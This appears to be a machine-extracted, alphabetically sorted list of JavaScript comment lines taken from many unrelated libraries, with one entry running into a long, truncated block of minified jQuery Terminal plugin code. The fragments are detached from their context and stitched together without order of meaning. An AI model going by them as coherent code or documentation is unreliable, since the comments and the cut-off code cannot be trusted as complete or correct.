"// ""o  The cookie-path is a prefix of the request-path, and the last"
"// ""raw value"" and ""value"" are not used here because jsdom has no GUI"
"// ""statements,"" it's safer simply to skip them."
"// ""this"" should be the larger one if appropriate."
"// ""time-field"" must be strictly ""1*2DIGIT"", HOWEVER, ""hms-time"" can be"
"// ""toplevel"" state. This is exactly"
"// ""true"" if we need to reverse every pair in the model lookup"
"// ""u"""
"// ""value"""
"// ""view more"" object name"
"// ""view more"" text"
"// ""view more"" url"
"// ""windows-1255"" - Logical Hebrew"
"// ""windows-1255"" and ""x-mac-hebrew"" are two different proper supersets of"
"// ""x-mac-hebrew"" - ?? Logical Hebrew ??"
"// ""x-mac-hebrew"" is also identified as windows-1255. A text in x-mac-hebrew"
"// ""year = 2*4DIGIT ( non-digit *OCTET )"""
"// ""|<-"";"
"// #7653, #8125, #8152: local protocol detection"
"// #id, .class, tag"
"// $&, $0 (not followed by 1-9), $00"
"// $('._dropdown-context').fadeOut(options.fadeSpeed, function(){"
"// $('head').append('<link href=""/js/libs/bmenu/bmenu.css"" rel=""stylesheet"">');"
"// $('li', '<ul>...</ul>')"
"// $('li', 'ul')"
"// $('li', node), $('li', [nodes])"
"// $(), $(null), $(undefined), $(false)"
"// $SQLITEFILE not found.""; exit; fi;"
"// $SQLITEFILE not found.""; fi;"
"// $lt, $lte, $gt and $gte work on numbers and strings"
"// %x2F (""/"") and skip the remaining step."""
"// '""', ""'"""
"// '.', 0-9, A-Z, '^', '_', '`', a-z, '|', '~'"
"// '/' on unix, 'c:/' on windows."
"// '/a/b/c/d' -> ['/', '/a', '/a/b', '/a/b/c', '/a/b/c/d']"
"// '0b', '0B' - binary number"
"// '0o', '0O' - octal number"
"// '0x', '0X' - hex number"
"// '<' 60, '>' 62, '{' 123, '}' 125"
"// 'Hello, World!'"
"// 'Hello, world!'"
"// 'JSON.stringify': JSON.stringify,"
"// 'User.get' has signature (id, callback(err, data))"
"// '[', '/', astral"
"// '\u' (U+005C, U+0075) denotes an escaped character."
"// '\u' (char #92, char #117) denotes an escaped character."
"// '`', '${'"
"// 'a=b,c'"
"// 'async', 'get', 'set', or 'static' were not a keyword contextually."
"// 'atomic', nondivisible expression types at the bottom. Most of"
"// 'button' },"
"// 'error-handler': [],"
"// 'foo' chunk flows to dest1 immediately, and is gone"
"// 'getCats' has signature (callback(err, data))"
"// 'informix': ['utf8', 'big5', 'dec8', 'cp850', 'hp8', 'koi8r', 'latin1', 'latin2', 'ascii', 'euckr', 'gb2312', 'gbk'],"
"// 'msTransform' is correct, but the other prefixes should be capitalized"
"// 'mssql': ['utf8', 'big5', 'dec8', 'cp850', 'hp8', 'koi8r', 'latin1', 'latin2', 'ascii', 'euckr', 'gb2312', 'gbk'],"
"// 'mysqli': ['utf8', 'big5', 'dec8', 'cp850', 'hp8', 'koi8r', 'latin1', 'latin2', 'ascii', 'euckr', 'gb2312', 'gbk'],"
"// 'oracle': ['UTF8','ZHS16GBK','ZHT16BIG5','ZHS16GBKFIXED','ZHT16BIG5FIXED'],"
"// 'oracle_oci8': ['UTF8','ZHS16GBK','ZHT16BIG5','ZHS16GBKFIXED','ZHT16BIG5FIXED'],"
"// 'postgresql': ['utf8', 'big5', 'dec8', 'cp850', 'hp8', 'koi8r', 'latin1', 'latin2', 'ascii', 'euckr', 'gb2312', 'gbk'],"
"// 'postgresql_pdo': ['utf8', 'big5', 'dec8', 'cp850', 'hp8', 'koi8r', 'latin1', 'latin2', 'ascii', 'euckr', 'gb2312', 'gbk'],"
"// 'schema-location': [],"
"// 'schema-type': [],"
"// 'sqlite_pdo': ['utf8'],"
"// 'sqlsrv': ['utf-8', 'char'],"
"// '{""a"":0,""b"":1,""o"":""[Circular]""}'"
"// '{""a"":1,""o"":""[Circular]""}'"
"// '{""b"":1,""a"":0,""o"":""[Circular]""}'"
"// '{""version"":3,""file"":""source-mapped.js"",""sources"":[""foo.js""],""names"":[""christopher""],""mappings"":"";;;;;;;;;mCAgCEA""}'"
"// '{""version"":3,""sources"":[""module-one.scm""],""names"":[],""mappings"":""...snip..."",""file"":""my-generated-javascript-file.js"",""sourceRoot"":""http://example.com/app/js/""}'"
"// ( namespace ) or ( selector, types [, fn] )"
"// ( types [, fn] )"
"// ( types, data, fn )"
"// ( types, fn )"
"// ( types, selector, fn )"
"// ( types-Object, data )"
"// ( types-Object, selector, data )"
"// ( types-object [, selector] )"
"// (""."") character."""
"// (#7102#comment:10, https://github.com/jquery/jquery/pull/557)"
"// (1 / +0|0) -> Infinity, but (1 / -0) -> -Infinity and (Infinity !== -Infinity)"
"// (100-nanoseconds offset from msecs) since unix epoch, 1970-01-01 00:00."
"// (1582-10-15 00:00).  JSNumbers aren't precise enough for this, so"
"// (2019), 11 (2020), 12 (2021), 13 (2022), or `""latest""` (the"
"// (?!) should work like \b\B, but is unreliable in Firefox"
"// (Also, check header.needPax to see if it needs a pax header.)"
"// (They are awkward, and in ES6 every block can be a scope.)"
"// (a,b) ': {"
"// (a,b)': {"
"// (although not necessarily the same order), equivalent values for every"
"// (because it's a hardlink, or because unlink:true is set, or it's"
"// (excepting DocumentFragment context, where the methods don't exist)"
"// (function(){ ... }()); does not need to be reprinted, even though"
"// (here, the decorated node) so that it includes node.decorators."
"// (here, the export declaration) so that it includes node.decorators."
"// (i.e. intervals of 100, 200, 400, 800, 1600, ... milliseconds)"
"// (id, class & pseudo-class)"
"// (if this implementation detail changes, this method will still"
"// (including the %x3B ("";"") in question)."" plus later on in the same section"
"// (like openingElement, closingElement, and children) are"
"// (octets will be different, every time)"
"// (protected) divide this by m, quotient and remainder to q, r (HAC 14.20)"
"// (protected) r = ""this * a"" without lower n words, n > 0"
"// (protected) r = lower n words of ""this * a"", a.t <= n"
"// (protected) r = this * a, r != this,a (HAC 14.12)"
"// (protected) r = this^2, r != this (HAC 14.16)"
"// (protected) return ""-1/this % 2^DB""; useful for Mont. reduction"
"// (protected) set from integer value x, -DV <= x < DV"
"// (protected) this % n, n < 2^26"
"// (protected) this *= n, this >= 0, 1 < n < DV"
"// (protected) this += n << w words, this >= 0"
"// (protected) this^e, e < 2^32, doing sqr and mul with ""r"" (HAC 14.79)"
"// (protected) true if probably prime (HAC 4.24, Miller-Rabin)"
"// (public) 0 if this == 0, 1 if this > 0"
"// (public) [this/a,this%a]"
"// (public) gcd(this,a) (HAC 14.54)"
"// (public) return + if this > a, - if this < a, 0 if equal"
"// (public) return the number of bits in ""this"""
"// (public) this^e % m, 0 <= e < 2^32"
"// (second clause tests for Object.defineProperty() in IE<9 that only supports extending DOM prototypes, but"
"// (setItem('foo', undefined) will return `null`), but"
"// (static pages), we can simply return the text as it is."
"// * match all (empty block, do not remove)"
"// *** negation, user action and target pseudo-classes"
"// **Reduce** builds up a single result from a list of values, aka `inject`,"
"// , comma"
"// - Any object or value whose internal [[Class]] property is not ""[object Object]"""
"// - Check duplicate argument names, if checkClashes is set."
"// - Every simple range `r1, r2, ...` is a null set, OR"
"// - Every simple range `r1, r2, ...` which is not a null set is a subset of"
"// - If EQ is more than one, return true (null set)"
"// - If GT and LT, and GT.semver > LT.semver, return true (null set)"
"// - If any C is a = range, and GT or LT are set, return false"
"// - Less-used features of style: disabled, scoped, title"
"// - Load events are not in the specs, but apparently some browsers"
"// - No data in the buffer, and the stream is in flowing mode. In this mode"
"// - abort otherwise,"
"// -> 'Smith, John'"
"// -> ['..', 'word', '1', '..']"
"// -> ['1', '<<2>>', '3']"
"// -> ['2', '4', '56']"
"// -> ['a', 'ab']"
"// -> ['a', 'b', 'c']"
"// -> ['a', 'b']"
"// -> ['t((e))s', '', 'ing']"
"// -> ['xregexp.com', 'www.google.com']"
"// -> [2, 4]"
"// ... except it avoids using URL, which wasn't available in the"
"// ... using predefined URL namespace (for, well, URLs)"
"// ...but misinterprets leading-number strings, particularly hex literals (""0x..."")"
"// .M, this is fine .\^/M.."
"// .get() because push.apply(_, arraylike) throws"
"// .params() calls .flush(), but the latter is always async in the"
"// .precedingNode, .enclosingNode, and/or .followingNode properties, at"
"// .set('Content-Type', 'application/x-www-form-urlencoded')"
"// / // / _  / _/ // / / / _  / _/     / /  \\/ / _ \\/ /"",""/  / / // / // / ___/ // // / / / ___/ // / / / / /\\  / // / /__"",""\\___/____ \\\\__/____/_/ \\__ / /_/____/_//_/ /_/ /_/  \\/\\__\\_\\___/"",""         \\/          /____/                                   "".replace(reg,"" "")+version_string,copyright],[""      __ _____                     ________                              __"",""     / // _  /__ __ _____ ___ __ _/__  ___/__ ___ ______ __ __  __ ___  / /"","" __ / // // // // // _  // _// // / / // _  // _//     // //  \\/ // _ \\/ /"",""/  / // // // // // ___// / / // / / // ___// / / / / // // /\\  // // / /__"",""\\___//____ \\\\___//____//_/ _\\_  / /_//____//_/ /_/ /_//_//_/ /_/ \\__\\_\\___/"",""          \\/              /____/                                          "".replace(reg,"""")+version_string,copyright]];$.terminal.defaults={prompt:""> "",history:true,exit:true,clear:true,enabled:true,historySize:60,checkArity:true,exceptionHandler:null,cancelableAjax:true,processArguments:true,linksNoReferrer:false,login:null,outputLimit:-1,onAjaxError:null,onRPCError:null,completion:false,historyFilter:null,onInit:$.noop,onClear:$.noop,onBlur:$.noop,onFocus:$.noop,onTerminalChange:$.noop,onExit:$.noop,keypress:$.noop,keydown:$.noop,strings:{wrongPasswordTryAgain:""Wrong password try again!"",wrongPassword:""Wrong password!"",ajaxAbortError:""Error while aborting ajax call!"",wrongArity:""Wrong number of arguments. Function '%s' expect %s got %s!"",commandNotFound:""Command '%s' Not Found!"",oneRPCWithIgnore:""You can use only one rpc with ignoreSystemDescribe"",oneInterpreterFunction:""You can't use more then one function (rpc with ""+""ignoreSystemDescribe is count as one)"",loginFunctionMissing:""You don't have login function"",noTokenError:""Access denied (no token)"",serverResponse:""Server reponse is"",wrongGreetings:""Wrong value of greetings parameter"",notWhileLogin:""You can't call that function while in login"",loginIsNotAFunction:""Authenticate must be a function"",canExitError:""You can't exit from main interpeter"",invalidCompletion:""Invalid completion"",login:""login"",password:""password""}};var requests=[];var terminals=new Cycle;$.fn.terminal=function(init_interpreter,options){function get_processed_command(command){if(typeof settings.processArguments===""function""){return processCommand(command,settings.processArguments)}else if(settings.processArguments){return $.terminal.parseCommand(command)}else{return $.terminal.splitCommand(command)}}function display_object(object){if(typeof object===""string""){self.echo(object)}else if(object instanceof Array){self.echo($.map(object,function(object){return $.json_stringify(object)}).join("" ""))}else if(typeof object===""object""){self.echo($.json_stringify(object))}else{self.echo(object)}}function display_json_rpc_error(error){if(typeof settings.onRPCError===""function""){settings.onRPCError.call(self,error)}else{self.error(""&#91;RPC&#93; ""+error.message)}}function make_basic_json_rpc_interpreter(url){var service=function(method,params){self.pause();$.jrpc(url,method,params,function(json){if(!json.error){if(typeof settings.processRPCResponse===""function""){settings.processRPCResponse.call(self,json.result)}else{display_object(json.result)}}else{display_json_rpc_error(json.error)}self.resume()},ajax_error)};return function(command,terminal){if(command===""""){return}command=get_processed_command(command);if(!settings.login||command.name===""help""){service(command.name,command.args)}else{var token=terminal.token();if(token){service(command.name,[token].concat(command.args))}else{terminal.error(""&#91;AUTH&#93; ""+strings.noTokenError)}}}}function make_object_interpreter(object,arity,fallback){return function(user_command,terminal){if(user_command===""""){return}var command=get_processed_command(user_command);var val=object[command.name];var type=$.type(val);if(type===""function""){if(arity&&val.length!==command.args.length){self.error(""&#91;Arity&#93; ""+sprintf(strings.wrongArity,command.name,val.length,command.args.length))}else{return val.apply(self,command.args)}}else if(type===""object""||type===""string""){var commands=[];if(type===""object""){commands=Object.keys(val);val=make_object_interpreter(val,arity)}terminal.push(val,{prompt:command.name+""> "",name:command.name,completion:type===""object""?function(term,string,callback){callback(commands)}:undefined})}else{if($.type(fallback)===""function""){fallback(user_command,self)}else if($.type(settings.onCommandNotFound)===""function""){settings.onCommandNotFound(user_command,self)}else{terminal.error(sprintf(strings.commandNotFound,command.name))}}}}function ajax_error(xhr,status,error){self.resume();if(typeof settings.onAjaxError==""function""){settings.onAjaxError.call(self,xhr,status,error)}else if(status!==""abort""){self.error(""&#91;AJAX&#93; ""+status+"" - ""+strings.serverResponse+"": \n""+xhr.responseText)}}function make_json_rpc_object(url,auth,success){$.jrpc(url,""system.describe"",[],function(ret){var commands=[];if(ret.procs){var interpreter_object={};$.each(ret.procs,function(_,proc){interpreter_object[proc.name]=function(){var append=auth&&proc.name!=""help"";var args=Array.prototype.slice.call(arguments);var args_len=args.length+(append?1:0);if(settings.checkArity&&proc.params&&proc.params.length!==args_len){self.error(""&#91;Arity&#93; ""+sprintf(strings.wrongArity,proc.name,proc.params.length,args_len))}else{self.pause();if(append){args=[self.token(true)].concat(args)}$.jrpc(url,proc.name,args,function(json){if(json.error){display_json_rpc_error(json.error)}else{display_object(json.result)}self.resume()},ajax_error)}}});success(interpreter_object)}else{success(null)}},function(){success(null)})}function make_interpreter(user_interpreter,auth,finalize){finalize=finalize||$.noop;var type=$.type(user_interpreter);var result={};var commands;var rpc_count=0;var function_interpreter;if(type===""array""){var object={};(function recur(interpreters,success){if(interpreters.length){var first=interpreters[0];var rest=interpreters.slice(1);var type=$.type(first);if(type===""string""){rpc_count++;self.pause();if(settings.ignoreSystemDescribe){if(rpc_count===1){function_interpreter=make_basic_json_rpc_interpreter(first)}else{self.error(strings.oneRPCWithIgnore)}recur(rest,success)}else{make_json_rpc_object(first,auth,function(new_object){if(new_object){$.extend(object,new_object)}self.resume();recur(rest,success)})}}else if(type===""function""){if(function_interpreter){self.error(strings.oneInterpreterFunction)}else{function_interpreter=first}}else if(type===""object""){$.extend(object,first);recur(rest,success)}}else{success()}})(user_interpreter,function(){commands=Object.keys(object);result.interpreter=make_object_interpreter(object,false,function_interpreter);result.completion=function(term,string,callback){callback(commands)};finalize(result)})}else if(type===""string""){if(settings.ignoreSystemDescribe){finalize({interpreter:make_basic_json_rpc_interpreter(user_interpreter),completion:settings.completion})}else{self.pause();make_json_rpc_object(user_interpreter,auth,function(object){if(object){var commands=Object.keys(object);result.interpreter=make_object_interpreter(object,false);result.completion=function(term,string,callback){callback(commands)}}else{result.interpreter=make_basic_json_rpc_interpreter(user_interpreter);result.completion=settings.completion}self.resume();finalize(result)})}}else if(type===""object""){commands=Object.keys(user_interpreter);result.interpreter=make_object_interpreter(user_interpreter,settings.checkArity);result.completion=function(term,string,callback){callback(commands)};finalize(result)}else{if(type===""undefined""){user_interpreter=$.noop}else if(type!==""function""){throw type+"" is invalid interpreter value""}finalize({interpreter:user_interpreter,completion:settings.completion})}}function make_json_rpc_login(url,login){var method=$.type(login)===""boolean""?""login"":login;return function(user,passwd,callback,term){self.pause();$.jrpc(url,method,[user,passwd],function(response){self.resume();if(!response.error&&response.result){callback(response.result)}else{callback(null)}},ajax_error)}}function exception_message(e){if(typeof e===""string""){return e}else if(typeof e.fileName===""string""){return e.fileName+"": ""+e.message}else{return e.message}}function display_exception(e,label){if(typeof settings.exceptionHandler==""function""){settings.exceptionHandler.call(self,e)}else{self.exception(e,label)}}function scroll_to_bottom(){var scrollHeight=scroll_object.prop?scroll_object.prop(""scrollHeight""):scroll_object.attr(""scrollHeight"");scroll_object.scrollTop(scrollHeight)}function validate(label,object){try{if(typeof object===""function""){object(function(){})}else if(typeof object!==""string""){var msg=label+"" must be string or function"";throw msg}}catch(e){display_exception(e,label.toUpperCase());return false}return true}var output_buffer=[];var NEW_LINE=1;function draw_line(string,options){try{var line_settings=$.extend({raw:false,finalize:$.noop},options||{});string=$.type(string)===""function""?string():string;string=$.type(string)===""string""?string:String(string);var i,len;if(!line_settings.raw){string=$.terminal.encode(string)}string=$.terminal.overtyping(string);string=$.terminal.from_ansi(string);output_buffer.push(NEW_LINE);if(!line_settings.raw&&(string.length>num_chars||string.match(/\n/))){var array=$.terminal.split_equal(string,num_chars);for(i=0,len=array.length;i<len;++i){if(array[i]===""""||array[i]===""\r""){output_buffer.push(""&nbsp;"")}else{if(line_settings.raw){output_buffer.push(array[i])}else{output_buffer.push($.terminal.format(array[i],{linksNoReferer:settings.linksNoReferer}))}}}}else{if(!line_settings.raw){string=$.terminal.format(string,{linksNoReferer:settings.linksNoReferer})}output_buffer.push(string)}output_buffer.push(line_settings.finalize)}catch(e){output_buffer=[];alert(""[Internal Exception(draw_line)]:""+exception_message(e)+""\n""+e.stack)}}function redraw(){command_line.resize(num_chars);var o=output.empty().detach();var lines_to_show;if(settings.outputLimit>=0){var limit=settings.outputLimit===0?self.rows():settings.outputLimit;lines_to_show=lines.slice(lines.length-limit-1)}else{lines_to_show=lines}$.each(lines_to_show,function(i,line){draw_line.apply(null,line)});command_line.before(o);self.flush()}function show_greetings(){if(settings.greetings===undefined){self.echo(self.signature)}else if(settings.greetings){var type=typeof settings.greetings;if(type===""string""){self.echo(settings.greetings)}else if(type===""function""){settings.greetings.call(self,self.echo)}else{self.error(strings.wrongGreetings)}}}function echo_command(command){command=$.terminal.escape_brackets($.terminal.encode(command,true));var prompt=command_line.prompt();if(command_line.mask()){command=command.replace(/./g,""*"")}if(typeof prompt===""function""){prompt(function(string){self.echo(string+command)})}else{self.echo(prompt+command)}}function commands(command,silent,exec){try{if(!ghost()){prev_command=$.terminal.splitCommand(command).name;if(exec&&typeof settings.historyFilter==""function""&&settings.historyFilter(command)||!settings.historyFilter){command_line.history().append(command)}}var interpreter=interpreters.top();if(command===""exit""&&settings.exit){var count=interpreters.size();self.token();if(count==1&&self.token()||count>1){if(!silent){echo_command(command)}self.pop()}}else{if(!silent){echo_command(command)}var position=lines.length-1;if(command===""clear""&&settings.clear){self.clear()}else{var result=interpreter.interpreter(command,self);if(result!==undefined){if(position===lines.length-1){lines.pop();if(result!==false){self.echo(result)}}else{if(result===false){lines=lines.slice(0,position).concat(lines.slice(position+1))}else{lines=lines.slice(0,position).concat([result]).concat(lines.slice(position+1))}}self.resize()}}}}catch(e){display_exception(e,""USER"");self.resume();throw e}}function global_logout(){if(typeof settings.onBeforeLogout===""function""){try{if(settings.onBeforeLogout(self)===false){return}}catch(e){display_exception(e,""onBeforeLogout"");throw e}}logout();if(typeof settings.onAfterLogout===""function""){try{settings.onAfterLogout(self)}catch(e){display_exception(e,""onAfterlogout"");throw e}}self.login(settings.login,true,initialize)}function logout(){var name=self.prefix_name(true)+""_"";$.Storage.remove(name+""token"");$.Storage.remove(name+""login"")}function maybe_append_name(interpreter_name){var storage_key=self.prefix_name()+""_interpreters"";var names=$.Storage.get(storage_key);if(names){names=$.parseJSON(names)}else{names=[]}if($.inArray(interpreter_name,names)==-1){names.push(interpreter_name);$.Storage.set(storage_key,$.json_stringify(names))}}function prepare_top_interpreter(silent){var interpreter=interpreters.top();var name=self.prefix_name(true);if(!ghost()){maybe_append_name(name)}command_line.name(name);if(typeof interpreter.prompt==""function""){command_line.prompt(function(command){interpreter.prompt(command,self)})}else{command_line.prompt(interpreter.prompt)}command_line.set("""");if(!silent&&typeof interpreter.onStart===""function""){interpreter.onStart(self)}}function initialize(){prepare_top_interpreter();show_greetings();var was_paused=false;if(typeof settings.onInit===""function""){onPause=function(){was_paused=true};try{settings.onInit(self)}catch(e){display_exception(e,""OnInit"");throw e}finally{onPause=$.noop;if(!was_paused){self.resume()}}}}function complete_helper(command,string,commands){var test=command_line.get().substring(0,command_line.position());if(test!==command){return}var regex=new RegExp(""^""+$.terminal.escape_regex(string));var matched=[];for(var i=commands.length;i--;){if(regex.test(commands[i])){matched.push(commands[i])}}if(matched.length===1){self.insert(matched[0].replace(regex,"""")+"" "")}else if(matched.length>1){if(tab_count>=2){echo_command(command);self.echo(matched.join(""	""));tab_count=0}else{var found=false;var found_index;var j;loop:for(j=string.length;j<matched[0].length;++j){for(i=1;i<matched.length;++i){if(matched[0].charAt(j)!==matched[i].charAt(j)){break loop}}found=true}if(found){self.insert(matched[0].slice(0,j).replace(regex,""""))}}}}function ghost(){return in_login||command_line.mask()}function key_down(e){var result,i,top=interpreters.top();if($.type(top.keydown)===""function""){result=top.keydown(e,self);if(result!==undefined){return result}}var completion;if(settings.completion&&$.type(settings.completion)!=""boolean""&&!top.completion){completion=settings.completion}else{completion=top.completion}self.oneTime(10,function(){on_scrollbar_show_resize()});if($.type(settings.keydown)===""function""){result=settings.keydown(e,self);if(result!==undefined){return result}}if(!self.paused()){if(e.which!==9){tab_count=0}if(e.which===68&&e.ctrlKey){if(!in_login){if(command_line.get()===""""){if(interpreters.size()>1||settings.login!==undefined){self.pop("""")}else{self.resume();self.echo("""")}}else{self.set_command("""")}}return false}else if(e.which===76&&e.ctrlKey){self.clear()}else if(completion&&e.which===9){++tab_count;var command=command_line.get().substring(0,command_line.position());var strings=command.split("" "");var string;if(strings.length==1){string=strings[0]}else{string=strings[strings.length-1];for(i=strings.length-1;i>0;i--){if(strings[i-1][strings[i-1].length-1]==""\\""){string=strings[i-1]+"" ""+string}else{break}}}switch($.type(completion)){case""function"":completion(self,string,function(commands){complete_helper(command,string,commands)});break;case""array"":complete_helper(command,string,completion);break;default:throw new Error($.terminal.defaults.strings.invalidCompletion)}return false}else if(e.which===86&&e.ctrlKey){self.oneTime(1,function(){scroll_to_bottom()});return}else if(e.which===9&&e.ctrlKey){if(terminals.length()>1){self.focus(false);return false}}else if(e.which===34){self.scroll(self.height())}else if(e.which===33){self.scroll(-self.height())}else{self.attr({scrollTop:self.attr(""scrollHeight"")})}}else if(e.which===68&&e.ctrlKey){if(requests.length){for(i=requests.length;i--;){var r=requests[i];if(4!==r.readyState){try{r.abort()}catch(error){self.error(strings.ajaxAbortError)}}}requests=[];self.resume()}return false}}var self=this;if(this.length>1){return this.each(function(){$.fn.terminal.call($(this),init_interpreter,$.extend({name:self.selector},options))})}else{if(self.data(""terminal"")){return self.data(""terminal"")}if(self.length===0){throw'Sorry, but terminal said that ""'+self.selector+'"" is not valid selector!'}var scroll_object;var prev_command;var loged_in=false;var tab_count=0;var lines=[];var output;var terminal_id=terminals.length();var num_chars;var num_rows;var command_list=[];var url;var in_login=false;var onPause=$.noop;var old_width,old_height;var dalyed_commands=[];var settings=$.extend({},$.terminal.defaults,{name:self.selector},options||{});var strings=$.terminal.defaults.strings;var enabled=settings.enabled;var paused=false;$.extend(self,$.omap({clear:function(){output.html("""");command_line.set("""");lines=[];try{settings.onClear(self)}catch(e){display_exception(e,""onClear"");throw e}self.attr({scrollTop:0});return self},export_view:function(){if(in_login){throw new Exception(strings.notWhileLogin)}return{prompt:self.get_prompt(),command:self.get_command(),position:command_line.position(),lines:lines.slice(0)}"
